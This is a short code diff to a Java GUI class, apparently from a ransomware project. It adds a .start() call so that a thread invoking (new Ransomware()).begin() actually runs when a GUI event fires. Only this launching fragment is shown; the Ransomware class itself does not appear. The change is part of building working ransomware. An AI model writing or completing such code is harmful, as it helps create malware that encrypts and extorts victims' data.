@@ -31,7 +31,7 @@ public class GUI extends Application {
 					public void run() {
 						(new Ransomware()).begin();
 					}
-				};
+				}.start();
 			}
 		});
 
